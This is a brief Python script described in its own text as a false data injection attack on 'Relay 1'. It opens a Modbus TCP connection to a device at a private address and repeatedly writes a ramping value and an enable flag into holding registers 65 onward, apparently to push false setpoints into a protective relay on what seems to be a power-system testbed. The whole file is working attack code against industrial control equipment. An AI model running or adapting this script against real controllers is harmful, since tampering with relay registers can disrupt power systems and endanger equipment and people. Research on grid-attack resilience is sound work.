from scapy.all import *
import os
import sys
import threading
import numpy as np
import matplotlib.pyplot as plt
from time import sleep
import argparse

interface    = "enx00249b305c9d"
target_ip    = "192.168.1.2"

parser=argparse.ArgumentParser(description='FDI attack for Relay 1')
parser.add_argument('-tf','--timef',help='final time of the attack',action='store',dest='timef',default=False)
args = parser.parse_args()
time_f = args.timef
print("the final time is"+time_f)

#from easymodbus.modbusClient import ModbusClient
from pymodbus.client.sync import ModbusTcpClient

phy_sys_att = ModbusTcpClient('192.168.10.103', 1508)




phy_sys_att.connect()

c = 1
m = 0.0005
Ts = 0.1
x = 0
time =[0]
values = [0]

ena = 10

if time_f=='1':
   
   for i in range (0,1):
        print(i)
        x = x+Ts
        time.append(x)
        y = m*x +c
        y2 = (np.round(y*100)/100)*1e3
        values.append(y2)
        #print(np.array([ena, y2]).astype(int))
        phy_sys_att.write_registers(65, np.array([ena, y2]).astype(int))
   #phy_sys_att.close()
   print("Communication terminated")
   

else:

    for i in range (0,3000):
        print(i)
        x = x+Ts
        time.append(x)
        y = m*x +c
        y2 = (np.round(y*100)/100)*1e3
        values.append(y2)
        #print(np.array([ena, y2]).astype(int))
        phy_sys_att.write_registers(65, np.array([ena, y2]).astype(int))
    phy_sys_att.close()     
 
